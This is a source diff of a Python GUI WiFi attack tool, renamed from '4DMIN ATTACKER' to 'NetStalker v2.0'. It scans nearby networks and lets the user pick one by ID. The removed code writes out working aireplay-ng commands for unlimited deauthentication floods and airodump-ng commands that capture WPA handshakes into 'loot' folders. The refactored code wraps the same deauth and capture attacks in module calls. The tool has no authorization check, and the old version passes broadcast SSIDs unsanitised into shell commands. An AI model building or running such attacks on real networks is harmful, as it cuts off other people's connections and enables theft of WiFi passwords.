@@ -1,221 +1,400 @@
-import customtkinter as ctk
-import tkinter as tk
-from tkinter import messagebox
-import subprocess
-import threading
-import os
-import csv
-import time
-import signal
+#!/usr/bin/env python3
+"""NetStalker GUI - Professional WiFi Penetration Testing Tool v2.0"""
 
-# --- GUI Theme --- 
+import os
+import sys
+import logging
+import threading
+from pathlib import Path
+
+import customtkinter as ctk
+from tkinter import messagebox, scrolledtext
+
+# Setup logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='[%(levelname)s] %(message)s'
+)
+logger = logging.getLogger(__name__)
+
+from core.network_manager import NetworkManager
+from core.scanner import WiFiScanner
+from core.attack import WiFiAttacker, AttackConfig
+
+# GUI Theme
 ctk.set_appearance_mode("Dark")
 ctk.set_default_color_theme("blue")
 
-class AdminAttackerSuite(ctk.CTk):
+
+class NetStalkerGUI(ctk.CTk):
+    """GUI application for NetStalker."""
+
     def __init__(self):
+        """Initialize the GUI application."""
         super().__init__()
 
-        # --- Window Settings ---
-        self.title("CREATED BY 4DMIN ATTACKER - PENTEST SUITE")
-        self.geometry("1150x750")
-        
-        self.attack_proc = None
-        self.networks_found = []
+        # Window setup
+        self.title("NetStalker v2.0 - WiFi Pentester")
+        self.geometry("1200x800")
+        self.protocol("WM_DELETE_WINDOW", self._on_closing)
 
-        # Layout Configuration
+        # Initialize components
+        self.network_manager = NetworkManager()
+        self.scanner = WiFiScanner(self.network_manager)
+        self.attacker = WiFiAttacker(AttackConfig())
+        self.networks = []
+        self.selected_interface = None
+        self.scan_thread = None
+
+        # Layout
         self.grid_columnconfigure(1, weight=1)
         self.grid_rowconfigure(0, weight=1)
 
-        # --- Sidebar ---
-        self.sidebar = ctk.CTkFrame(self, width=260, corner_radius=0)
-        self.sidebar.grid(row=0, column=0, sticky="nsew")
-        
+        # Create UI
+        self._create_sidebar()
+        self._create_main_view()
+
+    def _create_sidebar(self):
+        """Create sidebar with controls."""
+        sidebar = ctk.CTkFrame(self, width=280, corner_radius=0)
+        sidebar.grid(row=0, column=0, sticky="nsew")
+        sidebar.grid_rowconfigure(0, weight=0)
+
         # Logo
-        self.label_logo = ctk.CTkLabel(self.sidebar, text="4DMIN\nATTACKER", 
-                                       font=ctk.CTkFont(size=24, weight="bold", family="Courier"))
-        self.label_logo.pack(pady=(30, 20))
+        logo = ctk.CTkLabel(
+            sidebar,
+            text="NetStalker\nv2.0",
+            font=ctk.CTkFont(size=22, weight="bold")
+        )
+        logo.pack(pady=(20, 30))
 
-        # --- [NEW] Interface Selection Section (Top) ---
-        self.label_iface = ctk.CTkLabel(self.sidebar, text="STEP 1: SELECT INTERFACE", 
-                                        font=ctk.CTkFont(size=12, weight="bold"), text_color="#3b8ed0")
-        self.label_iface.pack(pady=(10, 5))
+        # Interface selection
+        iface_label = ctk.CTkLabel(
+            sidebar,
+            text="SELECT INTERFACE",
+            font=ctk.CTkFont(size=11, weight="bold"),
+            text_color="#3b8ed0"
+        )
+        iface_label.pack(pady=(10, 5))
 
-        # قائمة الانترفيس
-        self.iface_var = ctk.StringVar(value="Select Interface")
-        self.iface_menu = ctk.CTkOptionMenu(self.sidebar, values=self.get_interfaces(), 
-                                            variable=self.iface_var, height=35)
-        self.iface_menu.pack(pady=5, padx=20, fill="x")
+        self.iface_var = ctk.StringVar(value="[Select Interface]")
+        self.iface_menu = ctk.CTkOptionMenu(
+            sidebar,
+            values=self._get_interfaces(),
+            variable=self.iface_var,
+            command=self._on_interface_changed,
+            height=35
+        )
+        self.iface_menu.pack(pady=5, padx=15, fill="x")
 
-        # زر تحديث القائمة
-        self.btn_refresh = ctk.CTkButton(self.sidebar, text="REFRESH INTERFACES", 
-                                         command=self.refresh_ifaces, height=25, 
-                                         fg_color="transparent", border_width=1)
-        self.btn_refresh.pack(pady=(0, 20), padx=20, fill="x")
+        # Refresh button
+        refresh_btn = ctk.CTkButton(
+            sidebar,
+            text="REFRESH INTERFACES",
+            command=self._refresh_interfaces,
+            fg_color="transparent",
+            border_width=1,
+            height=28
+        )
+        refresh_btn.pack(pady=(0, 15), padx=15, fill="x")
 
-        # --- Control Buttons ---
-        self.btn_scan = self.create_btn("2. START SCAN", self.start_scan_thread, "#2e7d32")
-        self.btn_deauth = self.create_btn("3. DEAUTH ATTACK", self.ask_for_target_deauth, "#c62828")
-        self.btn_capture = self.create_btn("4. CAPTURE HANDSHAKE", self.ask_for_target_capture, "#f9a825")
-        self.btn_stop = self.create_btn("STOP ALL PROCESSES", self.kill_all, "#37474f")
+        # Scan button
+        self.scan_btn = ctk.CTkButton(
+            sidebar,
+            text="START SCAN",
+            command=self._start_scan,
+            fg_color="#2e7d32",
+            hover_color="#1b5e20",
+            height=45
+        )
+        self.scan_btn.pack(pady=10, padx=15, fill="x")
 
-        # Footer
-        self.sub_logo = ctk.CTkLabel(self.sidebar, text="DEVELOPER EDITION v3.5", font=ctk.CTkFont(size=10))
-        self.sub_logo.pack(pady=20, side="bottom")
+        # Attack buttons
+        self.deauth_btn = ctk.CTkButton(
+            sidebar,
+            text="DEAUTH ATTACK",
+            command=self._start_deauth,
+            fg_color="#c62828",
+            hover_color="#b71c1c",
+            height=45
+        )
+        self.deauth_btn.pack(pady=10, padx=15, fill="x")
 
-        # --- Main View ---
-        self.main_view = ctk.CTkFrame(self, fg_color="transparent")
-        self.main_view.grid(row=0, column=1, padx=20, pady=20, sticky="nsew")
+        self.capture_btn = ctk.CTkButton(
+            sidebar,
+            text="CAPTURE HANDSHAKE",
+            command=self._start_capture,
+            fg_color="#f57c00",
+            hover_color="#e65100",
+            height=45
+        )
+        self.capture_btn.pack(pady=10, padx=15, fill="x")
 
-        self.progress_bar = ctk.CTkProgressBar(self.main_view, orientation="horizontal", height=12)
-        self.progress_bar.set(0)
-        self.progress_bar.pack(fill="x", pady=(0, 15))
+        # Stop button
+        self.stop_btn = ctk.CTkButton(
+            sidebar,
+            text="STOP ALL ATTACKS",
+            command=self._stop_all,
+            fg_color="#455a64",
+            hover_color="#37474f",
+            height=45
+        )
+        self.stop_btn.pack(pady=10, padx=15, fill="x")
 
-        self.label_table = ctk.CTkLabel(self.main_view, text="NETWORK LIST (ID | SSID | BSSID | CH)", font=ctk.CTkFont(size=14, weight="bold"))
-        self.label_table.pack(anchor="w")
+        # Info label
+        info_label = ctk.CTkLabel(
+            sidebar,
+            text="v2.0 Refactored\nError Handling\nProfessional Quality",
+            font=ctk.CTkFont(size=9),
+            text_color="#888"
+        )
+        info_label.pack(pady=20, side="bottom")
 
-        self.listbox = tk.Listbox(self.main_view, bg="#000", fg="#00FF41", font=("Courier New", 12), 
-                                  borderwidth=0, highlightthickness=1, highlightbackground="#333",
-                                  selectbackground="#333")
-        self.listbox.pack(fill="both", expand=True, pady=10)
+    def _create_main_view(self):
+        """Create main content area."""
+        main_frame = ctk.CTkFrame(self, fg_color="transparent")
+        main_frame.grid(row=0, column=1, padx=20, pady=20, sticky="nsew")
+        main_frame.grid_rowconfigure(1, weight=1)
+        main_frame.grid_columnconfigure(0, weight=1)
 
-        self.console = ctk.CTkTextbox(self.main_view, height=180, fg_color="#000", text_color="#00FF41", font=("Courier", 12))
-        self.console.pack(fill="x")
-        self.log("Ready. Created by 4DMIN ATTACKER.")
+        # Progress bar
+        self.progress = ctk.CTkProgressBar(
+            main_frame,
+            orientation="horizontal",
+            height=8
+        )
+        self.progress.set(0)
+        self.progress.grid(row=0, column=0, sticky="ew", pady=(0, 15))
 
-    def create_btn(self, text, command, color):
-        btn = ctk.CTkButton(self.sidebar, text=text, command=command, fg_color=color, hover_color="#444", corner_radius=5, height=45, font=ctk.CTkFont(weight="bold"))
-        btn.pack(pady=10, padx=20, fill="x")
-        return btn
+        # Network list label
+        list_label = ctk.CTkLabel(
+            main_frame,
+            text="DISCOVERED NETWORKS",
+            font=ctk.CTkFont(size=13, weight="bold")
+        )
+        list_label.grid(row=1, column=0, sticky="ew", pady=(0, 10))
 
-    def log(self, msg):
-        self.console.insert("end", f">>> {msg}\n")
+        # Network list
+        list_frame = ctk.CTkFrame(main_frame)
+        list_frame.grid(row=2, column=0, sticky="nsew", pady=(0, 15))
+        list_frame.grid_rowconfigure(0, weight=1)
+        list_frame.grid_columnconfigure(0, weight=1)
+
+        self.network_list = ctk.CTkTextbox(
+            list_frame,
+            font=ctk.CTkFont(size=10, family="Courier"),
+            fg_color="#1a1a1a",
+            text_color="#00ff41"
+        )
+        self.network_list.grid(row=0, column=0, sticky="nsew")
+        self.network_list.insert("end", "[*] No networks scanned yet. Start scan to discover networks.\n")
+
+        # Console output
+        console_label = ctk.CTkLabel(
+            main_frame,
+            text="CONSOLE OUTPUT",
+            font=ctk.CTkFont(size=13, weight="bold")
+        )
+        console_label.grid(row=3, column=0, sticky="ew", pady=(10, 5))
+
+        console_frame = ctk.CTkFrame(main_frame)
+        console_frame.grid(row=4, column=0, sticky="nsew")
+        console_frame.grid_rowconfigure(0, weight=1)
+        console_frame.grid_columnconfigure(0, weight=1)
+
+        self.console = ctk.CTkTextbox(
+            console_frame,
+            font=ctk.CTkFont(size=9, family="Courier"),
+            fg_color="#000",
+            text_color="#00ff41",
+            height=150
+        )
+        self.console.grid(row=0, column=0, sticky="nsew")
+        
+        self._log("[*] NetStalker v2.0 Ready")
+        self._log("[*] Select interface and click START SCAN")
+
+    def _log(self, message: str):
+        """Add message to console.
+        
+        Args:
+            message: Message to log
+        """
+        self.console.insert("end", f"{message}\n")
         self.console.see("end")
 
-    def get_interfaces(self):
+    def _get_interfaces(self):
+        """Get available WiFi interfaces.
+        
+        Returns:
+            List of interface names
+        """
         try:
-            out = subprocess.check_output("iw dev | grep Interface", shell=True).decode()
-            ifaces = [line.split()[1] for line in out.split('\n') if line.strip()]
-            return ifaces if ifaces else ["No Interface Found"]
-        except: 
-            return ["No Interface Found"]
+            interfaces = self.network_manager.get_interfaces()
+            return [iface.name for iface in interfaces] or ["[None Found]"]
+        except Exception as e:
+            logger.error(f"Error getting interfaces: {e}")
+            return ["[Error]"]
 
-    def refresh_ifaces(self):
-        new_list = self.get_interfaces()
+    def _refresh_interfaces(self):
+        """Refresh interface list."""
+        new_list = self._get_interfaces()
         self.iface_menu.configure(values=new_list)
         self.iface_var.set(new_list[0])
-        self.log("Interface list updated.")
+        self._log("[*] Interface list refreshed")
 
-    def check_iface_selected(self):
-        val = self.iface_var.get()
-        if val == "Select Interface" or val == "No Interface Found":
-            messagebox.showerror("Error", "Please select a valid Wireless Interface first!")
-            return False
-        return val
-
-    def start_scan_thread(self):
-        iface = self.check_iface_selected()
-        if not iface: return
+    def _on_interface_changed(self, value: str):
+        """Handle interface selection.
         
-        self.listbox.delete(0, tk.END)
-        self.networks_found = []
-        threading.Thread(target=self.scan_logic, args=(iface,), daemon=True).start()
+        Args:
+            value: Selected interface name
+        """
+        if value and value not in ["[Select Interface]", "[None Found]", "[Error]"]:
+            self.selected_interface = value
+            self._log(f"[+] Selected interface: {value}")
+        else:
+            self.selected_interface = None
+            self._log("[-] No valid interface selected")
 
-    def scan_logic(self, iface):
-        self.log(f"Configuring {iface} to Monitor Mode...")
-        
-        subprocess.run(f"sudo airmon-ng check kill", shell=True, capture_output=True)
-        subprocess.run(f"sudo ip link set {iface} down", shell=True)
-        subprocess.run(f"sudo iw {iface} set type monitor", shell=True)
-        subprocess.run(f"sudo ip link set {iface} up", shell=True)
-
-        self.log("Scanning... Pulse 10s.")
-        temp_file = "/tmp/admin_scan"
-        subprocess.run(f"sudo rm {temp_file}* > /dev/null 2>&1", shell=True)
-
-        subprocess.Popen(f"sudo timeout 10 airodump-ng --write {temp_file} --output-format csv {iface}", 
-                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-        for i in range(1, 101):
-            self.progress_bar.set(i/100)
-            time.sleep(0.1) # 10 seconds total
-
-        self.progress_bar.set(0)
-        self.parse_csv(f"{temp_file}-01.csv")
-
-    def parse_csv(self, file_path):
-        if not os.path.exists(file_path):
-            self.log("Error: No data stream.")
+    def _start_scan(self):
+        """Start WiFi scan in separate thread."""
+        if not self.selected_interface:
+            messagebox.showerror("Error", "Please select an interface first!")
             return
 
-        with open(file_path, 'r') as f:
-            reader = csv.reader(f)
-            start = False
-            counter = 1
-            for row in reader:
-                if not row: continue
-                if "BSSID" in row[0]: start = True; continue
-                if "Station" in row[0]: break
-                if start and len(row) >= 14:
-                    net = {"id": counter, "bssid": row[0].strip(), "ch": row[3].strip(), "ssid": row[13].strip()}
-                    self.networks_found.append(net)
-                    display_text = f"[{counter}]  {net['ssid']:<20} | {net['bssid']} | CH: {net['ch']}"
-                    self.listbox.insert(tk.END, display_text)
-                    counter += 1
-        
-        self.log(f"Scan Finished. {len(self.networks_found)} Targets Detected.")
+        self.scan_btn.configure(state="disabled", text="[SCANNING...")
+        self.network_list.delete("1.0", "end")
+        self._log("[*] Starting WiFi scan...")
 
-    def ask_for_target_deauth(self):
-        iface = self.check_iface_selected()
-        if not iface: return
-        if not self.networks_found:
-            messagebox.showwarning("System", "Perform a scan first!")
-            return
-        
-        dialog = ctk.CTkInputDialog(text="Enter Target ID (e.g. 1):", title="Deauth Mission")
-        target_id = dialog.get_input()
-        
-        if target_id and target_id.isdigit():
-            idx = int(target_id) - 1
-            if 0 <= idx < len(self.networks_found):
-                self.run_deauth(self.networks_found[idx], iface)
+        self.scan_thread = threading.Thread(target=self._scan_worker, daemon=True)
+        self.scan_thread.start()
+
+    def _scan_worker(self):
+        """Perform WiFi scan."""
+        try:
+            # Set monitor mode
+            self._log(f"[*] Setting {self.selected_interface} to monitor mode...")
+            if not self.network_manager.set_monitor_mode(self.selected_interface):
+                self._log("[-] Failed to set monitor mode")
+                return
+
+            # Scan networks
+            self._log("[*] Scanning networks (10 seconds)...")
+            self.networks = self.scanner.scan(self.selected_interface)
+
+            # Display results
+            if self.networks:
+                self.network_list.delete("1.0", "end")
+                header = f"{'ID':<3} {'SSID':<25} {'BSSID':<17} {'CH':<3} {'SIGNAL':<6}\n"
+                header += "-" * 60 + "\n"
+                self.network_list.insert("end", header)
+
+                for i, net in enumerate(self.networks, 1):
+                    line = f"{i:<3} {net.ssid[:25]:<25} {net.bssid:<17} {net.channel:<3} {net.signal_strength:<6}\n"
+                    self.network_list.insert("end", line)
+
+                self._log(f"[+] Found {len(self.networks)} network(s)")
             else:
-                messagebox.showerror("Error", "ID out of range.")
+                self.network_list.insert("end", "[*] No networks found")
+                self._log("[-] No networks discovered")
+        except Exception as e:
+            self._log(f"[-] Scan error: {e}")
+            logger.error(f"Scan error: {e}")
+        finally:
+            self.scan_btn.configure(state="normal", text="START SCAN")
 
-    def run_deauth(self, target, iface):
-        self.log(f"ATTACKING -> {target['ssid']}")
-        subprocess.run(f"sudo iwconfig {iface} channel {target['ch']}", shell=True)
-        cmd = f"sudo aireplay-ng --deauth 0 -a {target['bssid']} {iface}"
-        self.attack_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL)
+    def _start_deauth(self):
+        """Start deauthentication attack."""
+        if not self.networks:
+            messagebox.showwarning("Warning", "Run scan first!")
+            return
 
-    def ask_for_target_capture(self):
-        iface = self.check_iface_selected()
-        if not iface: return
-        if not self.networks_found: return
-        
-        dialog = ctk.CTkInputDialog(text="Enter Target ID for Capture:", title="Capture Mission")
+        dialog = ctk.CTkInputDialog(
+            text="Enter target ID (1-{}): ".format(len(self.networks)),
+            title="Deauth Attack"
+        )
         target_id = dialog.get_input()
+
         if target_id and target_id.isdigit():
-            idx = int(target_id) - 1
-            if 0 <= idx < len(self.networks_found):
-                self.run_capture(self.networks_found[idx], iface)
+            try:
+                idx = int(target_id) - 1
+                if 0 <= idx < len(self.networks):
+                    target = self.networks[idx]
+                    self._log(f"[*] Starting deauth on {target.ssid}...")
+                    self.attacker.deauth_attack(
+                        target.bssid,
+                        self.selected_interface,
+                        duration=60
+                    )
+                    self._log(f"[+] Deauth attack launched")
+                else:
+                    messagebox.showerror("Error", "Invalid target ID!")
+            except Exception as e:
+                messagebox.showerror("Error", f"Error: {e}")
 
-    def run_capture(self, target, iface):
-        path = f"Loot_{target['ssid'].replace(' ', '_')}"
-        os.makedirs(path, exist_ok=True)
-        self.log(f"HANDSHAKE CAPTURE -> {path}/")
-        cmd = f"sudo airodump-ng -c {target['ch']} --bssid {target['bssid']} -w {path}/capture {iface}"
-        self.attack_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL)
+    def _start_capture(self):
+        """Start handshake capture."""
+        if not self.networks:
+            messagebox.showwarning("Warning", "Run scan first!")
+            return
 
-    def kill_all(self):
-        subprocess.run("sudo pkill aireplay-ng", shell=True)
-        subprocess.run("sudo pkill airodump-ng", shell=True)
-        if self.attack_proc: self.attack_proc.terminate()
-        self.log("All processes killed. Interface released.")
+        dialog = ctk.CTkInputDialog(
+            text="Enter target ID (1-{}): ".format(len(self.networks)),
+            title="Capture Handshake"
+        )
+        target_id = dialog.get_input()
+
+        if target_id and target_id.isdigit():
+            try:
+                idx = int(target_id) - 1
+                if 0 <= idx < len(self.networks):
+                    target = self.networks[idx]
+                    self._log(f"[*] Starting handshake capture on {target.ssid}...")
+                    self._log(f"[*] Saving to: ./loot/{target.ssid}/")
+                    
+                    cap_file = self.attacker.capture_handshake(
+                        target.bssid,
+                        target.channel,
+                        self.selected_interface,
+                        target.ssid,
+                        duration=300
+                    )
+                    
+                    if cap_file:
+                        self._log(f"[+] Handshake captured: {cap_file}")
+                    else:
+                        self._log("[-] No handshake captured")
+                else:
+                    messagebox.showerror("Error", "Invalid target ID!")
+            except Exception as e:
+                self._log(f"[-] Error: {e}")
+                logger.error(f"Capture error: {e}")
+
+    def _stop_all(self):
+        """Stop all active attacks."""
+        self.attacker.stop_attack()
+        self._log("[*] All attacks stopped")
+
+    def _on_closing(self):
+        """Handle window closing."""
+        if messagebox.askokcancel("Quit", "Stop attacks and quit?"):
+            try:
+                self.attacker.stop_attack()
+                if self.selected_interface:
+                    self.network_manager.set_managed_mode(self.selected_interface)
+            except Exception as e:
+                logger.error(f"Error during shutdown: {e}")
+            finally:
+                self.destroy()
+
 
 if __name__ == "__main__":
     if os.getuid() != 0:
-        print("ROOT ACCESS REQUIRED!")
-    else:
-        app = AdminAttackerSuite()
-        app.mainloop()
+        messagebox.showerror(
+            "Error",
+            "This tool requires root privileges!\n\nRun with: sudo python3 main_GUI.py"
+        )
+        sys.exit(1)
+
+    app = NetStalkerGUI()
+    app.mainloop()
